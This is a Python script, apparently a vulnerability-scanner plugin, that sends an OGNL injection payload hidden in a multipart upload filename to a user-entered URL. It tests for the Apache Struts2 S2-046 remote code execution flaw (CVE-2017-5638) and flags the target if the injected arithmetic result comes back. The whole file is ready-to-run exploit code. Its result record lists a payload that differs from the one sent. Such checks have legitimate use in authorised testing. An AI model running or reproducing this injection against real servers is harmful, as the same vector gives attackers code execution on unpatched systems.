import socket
import requests
import re
from urllib.parse import urlparse

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',4982935*2545583)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q),)
def s2_046(url):
    relsult = {
        'name': 'S2-046 Remote Code Execution Vulnerablity（CVE-2017-5638）',
        'vulnerable': False
    }
    try:
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(p + q)
            req = conn.recv(10240).decode()
            if re.search('12684474626105', req):
                relsult['vulnerable'] = True
                relsult['method'] = 'POST'
                relsult['url'] = url
                relsult['position'] = 'filename'
                relsult['payload'] = r'''Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',42935*2283)}\x00b"'''
            return relsult
    except:
        return relsult

if __name__ == '__main__':
    url = input('输入目标URL:')
    print(s2_046(url))
